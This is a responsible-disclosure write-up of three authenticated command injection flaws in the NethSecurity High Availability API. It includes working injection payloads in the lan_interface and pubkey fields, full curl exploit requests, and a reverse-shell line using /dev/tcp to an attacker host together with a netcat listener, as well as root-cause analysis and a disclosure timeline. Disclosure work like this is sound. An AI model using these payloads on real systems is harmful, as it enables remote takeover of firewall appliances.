# Nethesis NethSecurity - Vulnerability Disclosure

During a client engagement, we identified the presence of a [Nethesis NethSecurity](https://nethsecurity.org/) appliance within the target environment.

Without prior knowledge of its internal architecture or credentials, we conducted a series of black-box tests to assess potential exposure and evaluate the appliance’s resilience against unauthorized access and common attack vectors. Then, we downloaded the ISO from the vendor’s website to conduct further tests. The analysis led to the identification of some vulnerabilities in the High Availability (HA) implementation which may allow an attacker to exploit specific weaknesses in the appliance’s security mechanisms that would like to disclosure following the responsible disclosure process.

In detail, we found a series of missing input validation issues leading to command execution on API and functionality that can be exploited to execute arbitrary commands on both on local and remote NethSecurity appliances, as long as the attacker has API access and target root password. 

In the following section, we present the test environment we set up and the technical details of the vulnerabilities we found.

## Table of contents

 * [1. Environment](#1-environment)
 * [2. Technical details](#2-technical-details)
   * [2.1. Authenticated Local and/or Remote Code Execution – check-remote](#21-unauthenticated-sql-injection)
   * [2.2. Remote Command Execution via Arbitrary File Upload](#22-remote-command-execution-via-arbitrary-file-upload)
   * [2.3. Stored Cross-Site Scripting (XSS)](#23-stored-cross-site-scripting-xss)
 * [3. Disclosure](#3-disclosure)

## 1. Environment

In order to validate the finding in a controlled and reproducible manner, we performed a secondary assessment on a dedicated virtualized environment, deployed on Proxmox. This allowed us to confirm the issue independently of the production environment and rule out any context-specific variables.
We’ve set up two different instances of the latest Nethesis NethSecurity appliance, the 8.7.2 (24.10.5-ns.1.7.2) version at the time of writing this report. From the [Nethesis documentation](https://docs.nethsecurity.org/docs/administrator-manual/high-availability/ha_overview_features_limitations) the High Availability feature follows these concepts:
 * **Primary Node**: The firewall that actively handles traffic and services.
 * **Secondary (or backup) Node**: The firewall that automatically takes over in case of failure on the primary node.
 * **Virtual IP (VIP)**: A shared IP address used by both nodes for each configured interface to ensure uninterrupted client access to services. Clients on the network should always use the VIP address (e.g., as their gateway, DNS server, or VPN endpoint) to ensure seamless failover.

One instance, the primary node, has been configured with the following interfaces and IPs:
 * WAN: 192.168.1.101 (dynamically provided, based on the MAC address, with DHCP)
 * LAN: 192.168.1.100 (statically assigned)

And a secondary instance, the backup node, with the following interface and IP:
 * WAN: 192.168.1.111 (dynamically provided, based on the MAC address, with DHCP)
 * LAN: 192.168.1.110 (statically assigned)

All the identified vulnerabilities reside in the “ns-api” package at version 3.5.2-r1 (based on the output of `opkg list-installed`) provided with NethSecurity 8.7.2.

Based on changelog and source code analysis, these APIs are vulnerable starting from Nethesis NethSecurity 8.6 (24.10.0-ns.1.6.0) when the “High Availability Firewall” functionalities was introduced.

## 2. Technical details

### 2.1. Authenticated Local and/or Remote Code Execution – check-remote

A Code Injection exists in Nethesis NethSecurity High Availability API due to improper validation of user supplied input in `lan_interface` field in */api/ubus/call* with `path`: `ns.ha` and `method`: `check-remote`. This makes it possible for authenticated attackers to achieve local or remote code execution as long as they know remote root password.

#### Description

To configure high availability, there are a number of requirements that must be met on both the primary and secondary nodes.

The "check remote requirements" function is available to verify the requirements on the secondary, backup, node. This feature can be used via the CLI with the following command:

```sh
ns-ha-config check-backup-node <backup_node_ip> <lan_interface>
```

You can also use this feature with the API at `/api/ubus/call` with the following JSON payload:

```JSON
{
  "path": "ns.ha",
  "method": "check-remote",
  "payload": {
    "backup_node_ip": "<backup_node_ip>",
    "ssh_password": "<backup_node_password>",
    "lan_interface": "lan"
  }
}
```

We found out that `lan_interface` variable is not properly sanitized and it is passed unsafely to check_remote command (detailed information and code analysis are discussed in “Root Cause / Vulnerable Code” paragraph below) and can be used to build an arbitrary command via unsafe concatenation that will be executed on the target host (`backup_node_ip` variable) as long as you have administrative access on the appliance and the target host `ssh_password` is known.

So, the first requirement is to use administrative access to the API, e.g. with the following command to obtain a valid bearer token:

```sh
curl -s -H 'Content-Type: application/json' -k https://192.168.1.100:9090/api/login --data '{"username": "root", "password": "P4ssword!"}' | jq -r .token
```

Then, you can build the POST request with the following payload values:
 * `backup_node_ip`: the command execution target, it can be the appliance itself or a remote appliance IP
 * `ssh_password`: the target root password
 * `lan_interface`: the interface name, in which we will inject the desired commands

So, we can modify the lan_interface field as follows:

```sh
lan'; id >/tmp/id.txt; echo '
```

And the final payload executed on the remote appliance will be:

```sh
echo '{"role": "backup", "lan_interface": " lan'; id >/tmp/id.txt; echo '"}' | /usr/libexec/rpcd/ns.ha call validate-requirements
```

Now, on the remote host, is executed:
 1. `echo '{"role": "backup", "lan_interface": " lan';` that prints `{"role": "backup", "lan_interface": " lan`
 2. `id >/tmp/id.txt;` that save the output of `id` to `/tmp/id.txt`
 3. `echo '"}'` that prints `“}`

We can confirm the command execution by reading the new file created in `/tmp/id.txt`:

Figure 1 - Execution of "id > /tmp/id.txt"

We can also use a more complex payload to obtain a reverse shell. For example, we can use the following payload:

```sh
lan’; sh -I >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1; echo ‘
```

as you can see in the following screenshot of Burp suite.
 
Figure 2 - request and response from Burp Suite

And in a controlled attacker machine we can listen for the reverse shell with:

```sh
nc -lvnp 4444
```

This is an example of execution:
 
Figure 3 - Reverse shell

The same issue can be replicated with this curl request:

```sh
curl --path-as-is -i -s -k -X $'POST' -H $'Host: 192.168.1.100:9090' -H $'User-Agent: curl/8.20.0' -H $'Accept: */*' -H $'Content-Type: application/json' -H $'Authorization: Bearer <token>' -H $'Content-Length: 196' -H $'Connection: keep-alive' --data-binary $'{\"path\": \"ns.ha\", \"method\": \"check-remote\", \"payload\": {\"backup_node_ip\": \"192.168.1.100\", \"ssh_password\": \"P4ssword!\", \"lan_interface\": \"lan\'; sh -i >& /dev/tcp/192.168.1.238/4444 0>&1; echo \'\"}}' $'https://192.168.1.100:9090/api/ubus/call'
```

> Theoretically, vulnerability can also be used to connect to other hosts in the network to achieve code execution, as long as you have valid ssh root credentials.

#### Root Cause / Vulnerable code

The “check-remote” API method executes the `check_remote` function in `nethsecurity/packages/ns-api/files/ns.ha`. This function populates the “validate_command“ variable that includes, without any sanitization, the `lan_interface` parameter as we can see from the code on GitHub:
 
Figure 4 - check_remote source code from GitHub

Therefore, the `validate_command` variable is printed using `echo` and passed as input to the `ssh_execute` function via a pipe (`|`). The `ssh_execute` is used to execute a command on a remote machine via SSH, using the system “ssh” program (and optionally “sshpass”) as we can see from GitHub
 
Figure 5 - ssh_execute source code from GitHub

The function is called by the check_remote method with the following parameters:

```sh
ssh_execute(
    command='echo \'{"role": "backup", "lan_interface": "lan"}\' | /usr/libexec/rpcd/ns.ha call validate-requirements',
    host=backup_node_ip,
    port=22
    password=ssh_password
)
```

And it is like executing the following shell (bash command) command:

```sh
sshpass -p 'ssh_password' ssh -o StrictHostKeyChecking=no root@192.168.1.10 "echo '{\"role\": \"backup\", \"lan_interface\": \"lan\"}' | /usr/libexec/rpcd/ns.ha call validate-requirements"
```

the following command is consequently executed on the remote server:

```sh
echo '{"role": "backup", "lan_interface": "lan"}' | /usr/libexec/rpcd/ns.ha call validate-requirements
```

The remote shell interprets the command:
 1. echo print `{"role": "backup", "lan_interface": "lan"}`
 2. the character `|` (pipe) send this JSON to the standard input (stdin) of `/usr/libexec/rpcd/ns.ha call validate-requirements`
 3. the program read the JSON from the standard input and execute the validate-requirements procedure.

### 2.2 Authenticated Remote Code Execution – init-remote

A Code Injection exists in Nethesis NethSecurity High Availability API due to improper validation of user supplied input in `lan_interface` field in */api/ubus/call* with `path`: `ns.ha` and `method`: `init-remote`. This makes it possible for authenticated attackers to achieve remote code execution.

#### Description

This code execution happens on the remote, backup, node during the initialization process of the High Availability Firewall feature.

To actively exploit the lack of input validation of the lan_interface parameter during the initialization of the backup node, the first node must be initialized as the primary node. We need a static IP on both primary and backup node, then we need to initialize the primary node. The easiest way to do this is to use the script shipped within the package with:

```sh
ns-ha-config init-primary-node <primary_node_ip> <backup_node_ip> <virtual_ip> <lan_interface>
```

In our environment, as described in [1. Environment](#1-environment), we set up:
 * 192.168.1.100: as the LAN interface of the primary node
 * 192.168.1.110: as the LAN interface of the backup node
 * 192.168.1.200/24: as virtual IP
 * “lan”: as interface (for both primary and secondary nodes)

With the following command:

```sh
ns-ha-config init-primary-node 192.168.1.100 192.168.1.110 192.168.1.200/24 lan
```

Remember that the “lan” interface must have a static IP address.
 
Figure 6 - Successful set up of the primary node

Now, we can exploit the weakness in the init-remote API method in the primary node. To do this we need to know the password for the root account of the remote, backup, node. In our test environment the root password is “P4ssword!”.

The vulnerable field is lan_interface and we can use the same payload used in the check-remote feature in the following JSON payload:

```JSON
{
  "path": "ns.ha",
  "method": "init-remote",
  "payload": {
    "ssh_password": "P4ssword!",
    "lan_interface": "lan'; id > /tmp/id-bck.txt; echo '"
  }
}
```

The following screenshot highlight the full HTTP request made to the primary node
 
Figure 7 - request and response from Burp Suite

To verify the successful command execution, we can connect to the remote, backup, node via SSH (previously enabled via Web UI) with root account and its password and then we can print the content of the new file created, /tmp/id-bck.txt:
 
Figure 8 - Execution of "id > /tmp/id-bck.txt"

The same request can be replicated with this curl request:

```sh
curl --path-as-is -i -s -k -X $'POST' -H $'Host: 192.168.1.100:9090' -H $'User-Agent: curl/8.20.0' -H $'Accept: */*' -H $'Content-Type: application/json' -H $'Authorization: Bearer <token>' -H $'Content-Length: 140' -H $'Connection: keep-alive' --data-binary $'{\"path\": \"ns.ha\", \"method\": \"init-remote\", \"payload\": { \"ssh_password\": \"P4ssword!\", \"lan_interface\": \"lan\'; id > /tmp/id-bck.txt; echo \'\"}}' $'https://192.168.1.100:9090/api/ubus/call'
```

#### Root Cause / Vulnerable code
The vulnerability resides inside the init_remote function, as it initialize the init_local_command variable using the lan_interface field value without being sanitized, and the execute_remote_command function is subsequently executed. We used the source code available in GitHub to highlight the root cause.
 
Figure 9 - init_remote source code from GitHub

### 2.3 Authenticated Remote Code Execution - reset
A Code Injection exists in Nethesis NethSecurity High Availability API due to improper validation of user supplied input in `pubkey` field in */api/ubus/call* with `path`: `ns.ha` and `method`: `reset`. This makes it possible for authenticated attackers to achieve remote code execution.

#### Description
To exploit the reset functionality and gain RCE both the appliances must be configured for high availability. From the Nethesis documentation, the reset command restores the cluster configuration to its default state. Typically, after the reset, the primary node can continue operating normally, while the secondary node, no longer used in the cluster should be reset to default to avoid any conflicts. After the reset, only the HA interface remains active, so a reboot is required to complete the process. The reset must be performed locally on the primary node.

So, to achieve this command injection we need a valid bearer token for the primary node. Then, we can use the reset feature with the API at /api/ubus/call with the following JSON payload:

```JSON
{
  "path": "ns.ha",
  "method": "reset",
  "payload": {
    "role": "primary",
    "pubkey": "a'; id > /tmp/reset.txt; echo'"
  }
}
```

The vulnerability is triggered only with `role: primary` when the `pubkey` field is read without being sanitized, and the `execute_remote_command` function is subsequently executed.

The payload is sent to the primary node with valid credentials (a valid bearer token), but it is executed on the secondary, backup, node. No credentials is needed for the remote, backup, node due to the high availability configuration already set up.

We can see the payload, request and response, sent using Burp Suite in the following screenshot:
 
Figure 10 - request and response from Burp Suite

We can validate code execution on the remote, backup, node connecting via SSH (previously enabled via Web UI) with root account and its password and then we can print the content of /tmp/reset.txt:
 
Figure 11 - Execution of "id > /tmp/reset.txt"

The issue can be replicated with this curl command:

```sh
curl --path-as-is -i -s -k -X $'POST' -H $'Host: 192.168.1.100:9090' -H $'User-Agent: curl/8.20.0' -H $'Accept: */*' -H $'Content-Type: application/json' -H $'Authorization: Bearer <token>' -H $'Content-Length: 116' -H $'Connection: keep-alive' --data-binary $'{\"path\": \"ns.ha\", \"method\": \"reset\", \"payload\": { \"role\": \"primary\", \"pubkey\": \"a\'; id > /tmp/reset.txt; echo \'\"\x0d\x0a}}' $'https://192.168.1.100:9090/api/ubus/call'
```

#### Root Cause / Vulnerable code
If the `role` field is `primary`, the `pubkey` field is placed in a JSON that is passed to the `execute_remote_command`, as we can see in the code publicly available on GitHub starting from line 1090 in `nethsecurity/packages/ns-api/files/ns.ha`.
 
Figure 12 - reset source code from GitHub


## 3. Disclosure

We’ve decided to follow the industry standard 90+30 days responsible disclosure process; here’s the timeline:

 - **August 5, 2026**: Sent initial report to Nethesis’s security team (sviluppo@nethesis.it) with full technical details and PoC exploits. All compiled according to their "security" section of the [Developer Handbook](https://handbook.nethserver.org/security/#report-vulnerabilities).
 - **August 6, 2026**: Nethesis confirms the vulnerabilities, release a pubic [Pull Request](https://github.com/NethServer/nethsecurity/pull/1866) and sets the timeline for the remediation patch to September.
 - **September 30, 2026**: Nethesis publish the advisory [Authenticated command injection in NethSecurity High Availability API ](https://github.com/NethServer/nethsecurity/security/advisories/GHSA-4vpr-3hh7-mj6c).
